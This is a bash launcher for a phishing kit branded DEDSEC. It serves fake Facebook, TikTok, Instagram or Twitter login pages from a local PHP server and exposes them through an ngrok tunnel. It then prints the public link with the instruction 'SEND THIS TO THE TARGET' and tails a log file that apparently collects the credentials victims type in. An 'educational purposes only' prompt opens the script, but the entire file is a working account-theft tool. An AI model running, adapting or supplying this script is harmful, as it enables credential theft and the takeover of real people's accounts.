#!/bin/bash

clear
echo ""
read -p '   E D U C A T I O N A l  P U R P O S E S  O N L Y ?  (Y/N) :' option

if [[ $option == *'N'* ]]; then
	clear
	exit
	fi
	if [[ $option == *'n'* ]]; then
		clear
		exit
		fi
		
		php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
		ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
		kill -9 $php
		kill -9 $ngrok
		clear
		bash Logo.sh
		 
		echo ""

read -p " ＳＥＬＥＣＴ：" option
echo ""
if [ $option = 01 ] || [ $option = 1 ]
	then 
	cd main/ 
	cd facebook/
	echo ""
	echo  '       ---------------------------        '
	echo  '      █ PHP STARTING............. █       '
	echo  '       ---------------------------        '
	php -S 127.0.0.1:4444 > /dev/null 2>&1 &
	sleep 2
	echo  '       LOADING.                           '
	sleep 1
	echo  '       LOADING..                          '
	sleep 1
	echo  '       LOADING...                         '
	sleep 1
	echo  '       ---------------------------        '
	echo  '      █ NGROK STARTING........... █       '
	echo  '       ---------------------------        '
	ngrok http 4444 > /dev/null 2>&1 &
	sleep 1
	echo  '       NGROK LOADING.                     '
	sleep 1
	echo  '       NGROK LOADING..                    '
	sleep 1
	echo  '       NGROK LOADING...                   '
	sleep 1
	echo  '       GENERATING NEW LINK                '
	sleep 1
	echo  '       LOADING.                           '
	sleep 1
	echo  '       LOADING..                          '
	sleep 1
	echo  '       LOADING...                         '
	sleep 1
	echo  '       LOADING....                        '
	sleep 1
	echo  '       DONE                               '
	sleep 1
	clear
	echo ""
	link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep  -o 'https://...........................')
	echo ""
	echo ""
	echo  "████████████ FACEBOOK ACCOUNT ████████████"
	echo ""
	echo ""
	echo  '██ SEND THIS TO THE TARGET ██              █ DEDSEC █ V 1 █ █ █ █'
	printf "LINK :\e[0m\e[1;77m %s\e[0m\n" $link
	echo ""
	echo  '██ PAALALA ANG KARMA!'
	tail -f log.txt 
	
	break;
	elif [ $option = 02 ] || [ $option = 2 ]
	then
	cd main/
	cd tiktok/
	echo ""
	echo  '       ---------------------------        '
	echo  '      █ PHP STARTING............. █       '
	echo  '       ---------------------------        '
	php -S 127.0.0.1:4444 > /dev/null 2>&1 &
	sleep 2
	echo  '       LOADING.                           '
	sleep 1
	echo  '       LOADING..                          '
	sleep 1
	echo  '       LOADING...                         '
	sleep 1
	echo  '       ---------------------------        '
	echo  '      █ NGROK STARTING........... █       '
	echo  '       ---------------------------        '
	ngrok http 4444 > /dev/null 2>&1 &
	sleep 1
	echo  '       NGROK LOADING.                     '
	sleep 1
	echo  '       NGROK LOADING..                    '
	sleep 1
	echo  '       NGROK LOADING...                   '
	sleep 1
	echo  '       GENERATING NEW LINK                '
	sleep 1
	echo  '       LOADING.                           '
	sleep 1
	echo  '       LOADING..                          '
	sleep 1
	echo  '       LOADING...                         '
	sleep 1
	echo  '       LOADING....                        '
	sleep 1
	echo  '       DONE                               '
	sleep 1
	clear
	echo ""
	link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep  -o 'https://...........................')
	echo ""
	echo ""
	echo  "████████████ TIKTOK ACCOUNT ████████████"
	echo ""
	echo ""
	echo  '██ SEND THIS TO THE TARGET ██              █ DEDSEC █ V 1 █ █ █ █'
	printf "LINK :\e[0m\e[1;77m %s\e[0m\n" $link
	echo ""
	echo  '██ PAALALA ANG KARMA!'
	tail -f log.txt 
	
	break;
	elif [ $option = 03 ] || [ $option = 3 ]
	then
	cd main/
	cd instagram/
	echo ""
	echo  '       ---------------------------        '
	echo  '      █ PHP STARTING............. █       '
	echo  '       ---------------------------        '
	php -S 127.0.0.1:4444 > /dev/null 2>&1 &
	sleep 2
	echo  '       LOADING.                           '
	sleep 1
	echo  '       LOADING..                          '
	sleep 1
	echo  '       LOADING...                         '
	sleep 1
	echo  '       ---------------------------        '
	echo  '      █ NGROK STARTING........... █       '
	echo  '       ---------------------------        '
	ngrok http 4444 > /dev/null 2>&1 &
	sleep 1
	echo  '       NGROK LOADING.                     '
	sleep 1
	echo  '       NGROK LOADING..                    '
	sleep 1
	echo  '       NGROK LOADING...                   '
	sleep 1
	echo  '       GENERATING NEW LINK                '
	sleep 1
	echo  '       LOADING.                           '
	sleep 1
	echo  '       LOADING..                          '
	sleep 1
	echo  '       LOADING...                         '
	sleep 1
	echo  '       LOADING....                        '
	sleep 1
	echo  '       DONE                               '
	sleep 1
	clear
	echo ""
	link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep  -o 'https://...........................')
	echo ""
	echo ""
	echo  "████████████ INSTAGRAM ACCOUNT ████████████"
	echo ""
	echo ""
	echo  '██ SEND THIS TO THE TARGET ██              █ DEDSEC █ V 1 █ █ █ █'
	printf "LINK :\e[0m\e[1;77m %s\e[0m\n" $link
	echo ""
	echo  '██ PAALALA ANG KARMA!'
	tail -f log.txt
	
	break;
	
	break;
	elif [ $option = 04 ] || [ $option = 4 ]
	then
	cd main/
	cd twitter/
	echo ""
	echo  '       ---------------------------        '
	echo  '      █ PHP STARTING............. █       '
	echo  '       ---------------------------        '
	php -S 127.0.0.1:4444 > /dev/null 2>&1 &
	sleep 2
	echo  '       LOADING.                           '
	sleep 1
	echo  '       LOADING..                          '
	sleep 1
	echo  '       LOADING...                         '
	sleep 1
	echo  '       ---------------------------        '
	echo  '      █ NGROK STARTING........... █       '
	echo  '       ---------------------------        '
	ngrok http 4444 > /dev/null 2>&1 &
	sleep 1
	echo  '       NGROK LOADING.                     '
	sleep 1
	echo  '       NGROK LOADING..                    '
	sleep 1
	echo  '       NGROK LOADING...                   '
	sleep 1
	echo  '       GENERATING NEW LINK                '
	sleep 1
	echo  '       LOADING.                           '
	sleep 1
	echo  '       LOADING..                          '
	sleep 1
	echo  '       LOADING...                         '
	sleep 1
	echo  '       LOADING....                        '
	sleep 1
	echo  '       DONE                               '
	sleep 1
	clear
	echo ""
	link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep  -o 'https://...........................')
	echo ""
	echo ""
	echo  "████████████ TWITTER ACCOUNT ████████████"
	echo ""
	echo ""
	echo  '██ SEND THIS TO THE TARGET ██              █ DEDSEC █ V 1 █ █ █ █'
	printf "LINK :\e[0m\e[1;77m %s\e[0m\n" $link
	echo ""
	echo  '██ PAALALA ANG KARMA!'
	tail -f log.txt
	
	break;
	 	
	elif [ $option = 99 ]
	then     
	echo ' LAGOT KA!!! ' 
	exit 
	break;
	
	else 
		
		echo
		echo  " BOBO!! NUMBER HINDI LETTER "
		sleep 2
		exit
		fi
		dones
